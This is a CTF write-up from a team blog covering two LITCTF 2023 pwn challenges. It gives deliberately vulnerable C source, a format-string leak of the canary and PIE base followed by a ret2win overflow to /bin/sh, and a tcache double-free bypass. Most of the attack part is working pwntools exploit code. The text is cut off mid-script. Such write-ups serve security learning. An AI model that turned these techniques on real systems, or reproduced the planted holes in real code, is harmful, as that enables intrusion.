<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Lexington Informatics Tournament CTF 2023" /><meta name="author" content="12thRockYou, m0z" /><meta property="og:locale" content="en" /><meta name="description" content="Pwn" /><meta property="og:description" content="Pwn" /><link rel="canonical" href="https://ireland.re/posts/Lexington_Informatics_Tournament_CTF_23/" /><meta property="og:url" content="https://ireland.re/posts/Lexington_Informatics_Tournament_CTF_23/" /><meta property="og:site_name" content="Ireland.RE" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-08-08T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Lexington Informatics Tournament CTF 2023" /><meta name="twitter:site" content="@LooseSecurity" /><meta name="twitter:creator" content="@12thRockYou, m0z" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"12thRockYou, m0z"},"dateModified":"2023-08-30T13:50:16+00:00","datePublished":"2023-08-08T00:00:00+00:00","description":"Pwn","headline":"Lexington Informatics Tournament CTF 2023","mainEntityOfPage":{"@type":"WebPage","@id":"https://ireland.re/posts/Lexington_Informatics_Tournament_CTF_23/"},"url":"https://ireland.re/posts/Lexington_Informatics_Tournament_CTF_23/"}</script><title>Lexington Informatics Tournament CTF 2023 | Ireland.RE</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ireland.RE"><meta name="application-name" content="Ireland.RE"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /images/logo.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ireland.RE</a></div><div class="site-subtitle font-italic">Ireland Without the RE</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/members/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>MEMBERS</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/ECSCIreland" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/LooseSecurity" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['none','none.none'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Lexington Informatics Tournament CTF 2023</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Lexington Informatics Tournament CTF 2023</h1><div class="post-meta text-muted"><div> By <em> <a href="https://ctftime.org/team/179144">Ireland Without the RE</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1691452800" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2023-08-08 </em> </span> <span> Updated <em class="timeago" data-ts="1693403416" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2023-08-30 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3727 words"> <em>20 min</em> read</span></div></div></div><div class="post-content"><h1 id="pwn">Pwn</h1><h2 id="my-pet-canarys-birthday-pie"><span class="mr-2">My Pet Canary’s Birthday Pie</span><a href="#my-pet-canarys-birthday-pie" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Here is my first c program! I’ve heard about lots of security features in c, whatever they do. The point is, c looks like a very secure language to me! Try breaking it.</p><hr /><p>For this challenge we are given the source code along with the compiled binary. Lets first look at the source code:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
	<span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
	<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
	<span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">);</span>
	<span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">);</span>
	<span class="n">vuln</span><span class="p">();</span>
<span class="p">}</span>

</pre></table></code></div></div><p>Okay so only 3 functions, win, vuln and main.</p><p><code class="language-plaintext highlighter-rouge">win</code> just runs <code class="language-plaintext highlighter-rouge">system("/bin/sh");</code> for us. this will be our target.</p><p>vuln has two vulnerabilities, a format strings vulnerability in <code class="language-plaintext highlighter-rouge">printf</code> and a buffer overflow in <code class="language-plaintext highlighter-rouge">gets</code>.</p><p>The format strings will allow us to leak useful addresses within the binary as pie is enabled. we can also use this to leak the canary token, which is another security this binary has.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
</pre></table></code></div></div><p>The idea for this exploit will be:</p><p>use the format strings to leak an address in the binary, this will help us the address of <code class="language-plaintext highlighter-rouge">win</code> and we also want to leak the canary token. To help with this I use a simple fuzz script:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./s'</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span><span class="n">level</span><span class="o">=</span><span class="s">'error'</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"%</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">$p"</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"offset </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
</pre></table></code></div></div><p>This will print out the leak and the offset of that leak. We know the leak for the elf file will start with <code class="language-plaintext highlighter-rouge">0x55</code> or <code class="language-plaintext highlighter-rouge">0x56</code> this can vary slightly but its a good ballpark. The canary token should always end in <code class="language-plaintext highlighter-rouge">00</code>.</p><p>These are some leaks we get:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>offset 1 b'0x1'
offset 2 b'0x1'
offset 3 b'0x7f6cfa619aa0'
offset 4 b'(nil)'
offset 5 b'(nil)'
offset 6 b'0x7f0070243625'
offset 7 b'0x7fed790815ff'
offset 8 b'(nil)'
offset 9 b'(nil)'
offset 10 b'0x7ffecfe285c0'
offset 11 b'0xe9f733d70ed31600'
offset 12 b'0x7ffcbea30270'
offset 13 b'0x560354ce82ae'
offset 14 b'0x1'
offset 15 b'0x7f088c429d90'
</pre></table></code></div></div><p>11 looks like the canary token, and 13 looks like a stack address. we can confirm this by using <code class="language-plaintext highlighter-rouge">gbd</code> the steps for that are:</p><p>run the program with <code class="language-plaintext highlighter-rouge">gdb ./s</code> enter <code class="language-plaintext highlighter-rouge">%11$p %13%p</code> to get the leaks and use ctrl+c to break the program. <code class="language-plaintext highlighter-rouge">x/s 0x5....</code> for the elf leak and just type <code class="language-plaintext highlighter-rouge">canary</code> for the canary token. we can see the canary token matches up and the other leak shows <code class="language-plaintext highlighter-rouge">&lt;main+58&gt;</code> so we are leaking main+58. we can run the program a few time to match sure this is always the same. Once we know that we can workout the offset at which main+58 is. and we minus that from our leak and it will give us the base address of the program.</p><h3 id="building-the-exploit"><span class="mr-2">Building the exploit</span><a href="#building-the-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>The last part we need is the offset. Due to the canary just throwing a cyclic pattern will know fill rbp with data so we can work it out manually.</p><p>The buffer is <code class="language-plaintext highlighter-rouge">32</code> and we will need to padding to reach rbp so it should be 32+8</p><p>setting out offset as 40 we just need to build the exploit.</p><p>our first payload will just be the two format string offsets. after we get those leaks we need to get the base address of the program. (we could also just work out the offset from our leak to win)</p><p>and the 2nd payload will be</p><p>padding * 40 + canary token + junk data to reach rbp + ret + win</p><p>we need to ret address otherwise our stack alignment will be off.</p><p>we get this with <code class="language-plaintext highlighter-rouge">ropper --file s --search "ret"</code></p><p>our final exploit script looks like this:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">exe</span> <span class="o">=</span> <span class="s">'./s'</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">)</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'alacritty'</span><span class="p">,</span> <span class="s">'-e'</span><span class="p">,</span> <span class="s">'zsh'</span><span class="p">,</span> <span class="s">'-c'</span><span class="p">]</span>

<span class="c1">#context.log_level= 'DEBUG'
</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>  <span class="c1"># Set GDBscript below
</span>        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>  <span class="c1"># ('server', 'port')
</span>        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>  <span class="c1"># Run locally
</span>        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''

'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="c1">#### Exploit starts here ####
</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1">#canary token is 11
</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">40</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'%11$p %13$p'</span><span class="p">)</span>

<span class="n">leaks</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
<span class="n">leaks</span> <span class="o">=</span> <span class="n">leaks</span><span class="p">.</span><span class="n">split</span><span class="p">()</span>
<span class="n">canary</span> <span class="o">=</span> <span class="n">leaks</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">binleak</span> <span class="o">=</span> <span class="n">leaks</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="n">binleak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">binleak</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
<span class="n">base</span> <span class="o">=</span> <span class="n">binleak</span> <span class="o">-</span> <span class="mh">0x12ae</span>
<span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">canary</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>

<span class="n">win</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x11e9</span>
<span class="n">ret</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x101a</span>
<span class="n">main</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x1274</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"canary token </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span> <span class="o">*</span> <span class="mi">8</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">win</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>flag: <code class="language-plaintext highlighter-rouge">LITCTF{rule_1_of_pwn:_use_checksec_I_think_06d2ee2b}</code></p><h2 id="file-reader"><span class="mr-2">File Reader?</span><a href="#file-reader" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This program reads a file called flag.txt, but it doesn’t seem to work…</p><hr /><p>We are given the source code, the binary and the glibc files.</p><p>Lets look at the source code:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">c</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">64</span><span class="p">);</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">d</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">64</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">d</span><span class="p">);</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>

    <span class="n">scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">b</span><span class="p">);</span>

    <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">a</span><span class="p">)</span> <span class="o">=</span> <span class="n">b</span><span class="p">;</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">"Exiting..."</span><span class="p">);</span>

    <span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
    <span class="n">d</span><span class="p">[</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">d</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">d</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>We can see the use of malloc and free so this will be a heap related exploit.</p><p>running the program leaks an address. <code class="language-plaintext highlighter-rouge">printf("%p\n", d);</code></p><p>This is leaking the address of d, which means we have a heap address beaning leaked. c is than free’d.</p><p>The next 3 lines of code is what we are exploiting:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>
<span class="n">scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">b</span><span class="p">);</span>

<span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">a</span><span class="p">)</span> <span class="o">=</span> <span class="n">b</span><span class="p">;</span>
</pre></table></code></div></div><p>The scanf will let us write to a and b. and <code class="language-plaintext highlighter-rouge">*((unsigned long *)a) = b;</code> is than writing the content of b to a.</p><p>next the program frees c again, but this is a double free which makes the program crash. it crashes just before the flag is printed as well which is a shame :(</p><p>we can see that in action by just writing any data to the leaked address. (we first convert the hex address to int)</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>❯ ./s
0x55e85c2762f0
94456466858736
123
Exiting...
free(): double free detected in tcache 2
</pre></table></code></div></div><p>So the idea for this will be to stop the double free.</p><p>We know the malloc chunk is 64 bytes so we if take say, 65 away from the leaked address, and write junk data to that location. we can overwrite the key value of that chunk, this way the program does not know if this chunk has been free’d and the program will not crash, and it will reach the part that prints the flag.</p><p>the exploit script:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">exe</span> <span class="o">=</span> <span class="s">'./s'</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">)</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'alacritty'</span><span class="p">,</span> <span class="s">'-e'</span><span class="p">,</span> <span class="s">'zsh'</span><span class="p">,</span> <span class="s">'-c'</span><span class="p">]</span>

<span class="c1">#context.log_level= 'DEBUG'
</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>  <span class="c1"># Set GDBscript below
</span>        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>  <span class="c1"># ('server', 'port')
</span>        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>  <span class="c1"># Run locally
</span>        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''

'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="c1">#### Exploit starts here ####
</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="n">heapaddr</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
<span class="n">heapaddr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">heapaddr</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

